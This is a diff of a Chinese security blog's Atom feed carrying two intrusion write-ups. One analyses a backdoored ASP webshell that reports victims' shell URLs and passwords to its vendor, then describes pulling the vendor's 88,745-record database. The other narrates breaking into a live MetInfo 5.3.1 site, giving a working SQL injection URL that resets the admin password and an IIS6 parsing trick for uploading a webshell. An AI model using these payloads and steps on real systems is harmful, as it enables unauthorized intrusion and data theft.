@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://www.chabug.org/"/>
-  <updated>2017-12-16T14:37:30.498Z</updated>
+  <updated>2017-12-22T10:09:47.675Z</updated>
   <id>http://www.chabug.org/</id>
   
   <author>
@@ -21,16 +21,16 @@
     <link href="http://www.chabug.org/2017/12/16/hack-webshellbox-mumaasp/"/>
     <id>http://www.chabug.org/2017/12/16/hack-webshellbox-mumaasp/</id>
     <published>2017-12-16T14:32:39.000Z</published>
-    <updated>2017-12-16T14:37:30.498Z</updated>
+    <updated>2017-12-22T10:09:47.675Z</updated>
     
-    <content type="html"><![CDATA[<p>好像是最大的 管它呢</p><p>先下载它的一个asp大马.<br><img src="http://www.exp10it.tk/usr/uploads/2017/12/2314873204.jpg" alt=""><br>放入wwwroot netbox 启动<br><img src="http://www.exp10it.tk/usr/uploads/2017/12/3215032467.jpg" alt=""><br>抓包分析<br><img src="http://www.exp10it.tk/usr/uploads/2017/12/2128883817.jpg" alt=""><br><code>http://www.mumaasp.com/xz/sx.asp?u=127.0.0.1:81/Asp%C3%E2%C9%B1%B4%F3%C2%ED.asp&amp;p=mumaasp.com</code></p><p>u 为网站地址 p为shell密码</p><p>本来想插xss的 不过手贱打开看了一下<br><img src="http://www.exp10it.tk/usr/uploads/2017/12/4270195503.jpg" alt=""><br>源码直接爆出来了 其中有Checkxss函数</p><p>可以进行代码审计 不过再往下翻看看?<br><img src="http://www.exp10it.tk/usr/uploads/2017/12/238681465.jpg" alt=""><br><code>^%$@#!!!858879018!@#.mdb</code></p><p>数据库名称</p><p>url编码</p><p><code>%5E%25%24%40%23%21%21%21%38%35%38%38%37%39%30%31%38%21%40%23%2E%6D%64%62</code></p><p>访问<br><img src="http://www.exp10it.tk/usr/uploads/2017/12/3374162490.jpg" alt=""><br>88745条  </p><p><img src="http://www.exp10it.tk/usr/uploads/2017/12/1931068573.png" alt=""><br>惊不惊喜 意不意外<br><code>裤子就不放出来了。</code></p>]]></content>
+    <content type="html"><![CDATA[<p>好像是最大的 管它呢</p><p>先下载它的一个asp大马.<br><img src="http://ww1.sinaimg.cn/large/006xriynly1fmppf4go55j31400dp75l.jpg" alt=""><br>放入wwwroot netbox 启动<br><img src="http://ww1.sinaimg.cn/large/006xriynly1fmppf4edawj30go02rgll.jpg" alt=""><br>抓包分析<br><img src="http://ww1.sinaimg.cn/large/006xriynly1fmppf4jwkqj31gt06l0ub.jpg" alt=""><br><code>http://www.mumaasp.com/xz/sx.asp?u=127.0.0.1:81/Asp%C3%E2%C9%B1%B4%F3%C2%ED.asp&amp;p=mumaasp.com</code></p><p>u 为网站地址 p为shell密码</p><p>本来想插xss的 不过手贱打开看了一下<br><img src="http://ww1.sinaimg.cn/large/006xriynly1fmppf4eepuj30gk06o0sy.jpg" alt=""><br>源码直接爆出来了 其中有Checkxss函数</p><p>可以进行代码审计 不过再往下翻看看?<br><img src="http://ww1.sinaimg.cn/large/006xriynly1fmppf4fqahj30hs06eglu.jpg" alt=""><br><code>^%$@#!!!858879018!@#.mdb</code></p><p>数据库名称</p><p>url编码</p><p><code>%5E%25%24%40%23%21%21%21%38%35%38%38%37%39%30%31%38%21%40%23%2E%6D%64%62</code></p><p>访问<br><img src="http://ww1.sinaimg.cn/large/006xriynly1fmppf4eh75j30cg05t74e.jpg" alt=""><br>88745条  </p><p><img src="http://ww1.sinaimg.cn/large/006xriynly1fmppf4dql4j303j00r0n5.jpg" alt=""><br>惊不惊喜 意不意外<br><code>裤子就不放出来了。</code></p>]]></content>
     
     <summary type="html">
     
       
       
         &lt;p&gt;好像是最大的 管它呢&lt;/p&gt;
-&lt;p&gt;先下载它的一个asp大马.&lt;br&gt;&lt;img src=&quot;http://www.exp10it.tk/usr/uploads/2017/12/2314873204.jpg&quot; alt=&quot;&quot;&gt;&lt;br&gt;放入wwwroot netbox 启动&lt;br&gt;
+&lt;p&gt;先下载它的一个asp大马.&lt;br&gt;&lt;img src=&quot;http://ww1.sinaimg.cn/large/006xriynly1fmppf4go55j31400dp75l.jpg&quot; alt=&quot;&quot;&gt;&lt;br&gt;放入wwwroot netbo
       
     
     </summary>
@@ -43,9 +43,9 @@
     <link href="http://www.chabug.org/2017/12/16/metinfo-test/"/>
     <id>http://www.chabug.org/2017/12/16/metinfo-test/</id>
     <published>2017-12-16T14:20:37.000Z</published>
-    <updated>2017-12-16T14:29:10.025Z</updated>
+    <updated>2017-12-22T10:13:45.745Z</updated>
     
-    <content type="html"><![CDATA[<p>全文转自<a href="http://exp10it.tk/index.php/archives/163/" target="_blank" rel="external">X1r0z</a><br>目标站</p><p>php + mysql + iis6 + 2003</p><p>查看一下robots.txt<br><img src="http://www.exp10it.tk/usr/uploads/2017/12/3379412226.jpg" alt="">  </p><p>访问 /admin</p><p>登录框输入单引号 没报错</p><p>查看网站title才发现这是metinfo的<br><img src="http://www.exp10it.tk/usr/uploads/2017/12/2182460650.jpg" alt=""><br>搜索了一下metinfo的最新漏洞</p><p>metinfo 5.3.1 注入漏洞 + 后台getshell</p><p>直接访问</p><p><code>/admin/login/login_check.php?met_cookie_filter[a]=a%27,admin_pass=md5(1234567)+where+id=1;+%23--</code></p><p>将admin密码改成1234567</p><p>感觉有点暴力= =</p><p>成功登录后台<br><img src="http://www.exp10it.tk/usr/uploads/2017/12/2935186942.jpg" alt=""><br>在文章那里找到上传点<br><img src="http://www.exp10it.tk/usr/uploads/2017/12/3889988867.jpg" alt=""><br>CKFinder<br><img src="http://www.exp10it.tk/usr/uploads/2017/12/4239075018.jpg" alt=""><br>服务器是iis6的 可以直接用解析漏洞</p><p>这里的CKFinder不能重命名</p><p>直接创建a.asp文件夹 上传一句话<br><img src="http://www.exp10it.tk/usr/uploads/2017/12/276582478.jpg" alt=""><br><img src="http://www.exp10it.tk/usr/uploads/2017/12/2069013318.jpg" alt=""></p>]]></content>
+    <content type="html"><![CDATA[<p>全文转自<a href="http://exp10it.tk/index.php/archives/163/" target="_blank" rel="external">X1r0z</a><br>目标站</p><p>php + mysql + iis6 + 2003</p><p>查看一下robots.txt<br><img src="http://ww1.sinaimg.cn/large/006xriynly1fmppjzfvp2j30i50d0t9f.jpg" alt=""><br>访问 /admin</p><p>登录框输入单引号 没报错</p><p>查看网站title才发现这是metinfo的<br><img src="http://ww1.sinaimg.cn/large/006xriynly1fmppjzdmg2j30sr0didga.jpg" alt=""></p><p>搜索了一下metinfo的最新漏洞</p><p>metinfo 5.3.1 注入漏洞 + 后台getshell</p><p>直接访问</p><p><code>/admin/login/login_check.php?met_cookie_filter[a]=a%27,admin_pass=md5(1234567)+where+id=1;+%23--</code></p><p>将admin密码改成1234567</p><p>感觉有点暴力= =</p><p>成功登录后台<br><img src="http://ww1.sinaimg.cn/large/006xriynly1fmppjzcva6j30uq0hgt9f.jpg" alt=""><br>在文章那里找到上传点<br><img src="http://ww1.sinaimg.cn/large/006xriynly1fmppjzcxxyj30d50hm3zi.jpg" alt=""><br>CKFinder<br><img src="http://ww1.sinaimg.cn/large/006xriynly1fmppjzcj2gj30qz052mxc.jpg" alt=""><br>服务器是iis6的 可以直接用解析漏洞</p><p>这里的CKFinder不能重命名</p><p>直接创建a.asp文件夹 上传一句话<br><img src="http://ww1.sinaimg.cn/large/006xriynly1fmppjzd1f2j30cs068glm.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/006xriynly1fmppjzgyc6j30lt07ft8w.jpg" alt=""></p>]]></content>
     
     <summary type="html">
     
